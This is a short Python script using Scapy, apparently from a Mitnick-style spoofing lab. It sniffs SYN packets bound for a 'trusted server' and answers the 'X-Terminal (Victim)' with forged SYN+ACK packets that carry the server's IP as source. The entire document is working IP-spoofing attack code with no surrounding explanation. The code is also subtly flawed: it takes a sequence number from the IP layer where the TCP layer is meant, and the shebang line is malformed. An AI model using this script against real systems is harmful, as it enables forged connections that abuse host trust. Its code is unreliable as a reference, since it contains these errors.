#!usr/bin/python3

from scapy.all import *

x_ip = "192.168.12.5" #X-Terminal 
x_port = 1023 #Port number used by X-Terminal

srv_ip = "192.168.12.6" #The trusted server 
srv_port = 9090 #Port number used by the trusted server 


def spoof_pkt(pkt):
	Seq=123456788
	old_ip=pkt[IP]
	old_tcp=pkt[TCP]

#send a SYN-ACK packet when a SYN packet is received from the X terminal
	if old_tcp.flags=="S":
		print("sending spoofed SYN+ACK packet to the X-Terminal (Victim)")
		ip=IP(src=srv_ip,dst=x_ip)
		tcp=TCP(sport=srv_port, dport=x_port, flags="SA", seq=Seq, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)
#Sniff when the dst IP is ... and port no is ...
pkt=sniff(filter="tcp and dst host 192.168.12.6 and dst port 9090", prn=spoof_pkt) 
